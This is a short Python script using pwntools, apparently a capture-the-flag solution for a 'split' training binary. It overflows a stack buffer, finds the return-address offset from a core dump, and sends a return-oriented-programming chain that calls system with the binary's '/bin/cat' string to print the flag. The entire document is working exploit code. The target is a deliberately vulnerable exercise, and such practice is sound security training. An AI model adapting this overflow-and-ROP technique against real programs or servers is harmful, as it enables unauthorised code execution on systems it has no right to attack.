#!/usr/bin/env python3

from pwn import *

exe = ELF("./split_patched")

context.binary = exe
rop = ROP(exe)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    system = exe.symbols.system
    bincat = next(exe.search(b'/bin/cat'))
    rdi = rop.rdi.address
    ret = rop.ret.address
    payload = cyclic(100)

    r.sendlineafter(b'>', payload)
    r.wait()
    
    core = r.corefile
    stack = core.rsp
    rip_value = core.read(stack, 4)
    rip_offset = cyclic_find(rip_value)

    r = conn()
    payload = flat(b'A'*rip_offset + p64(ret) + p64(rdi) + p64(bincat) + p64(system))

    r.sendlineafter(b'>', payload)

    r.recv()
    r.recv()
    flag = r.readline()
    print(flag)

if __name__ == "__main__":
    main()
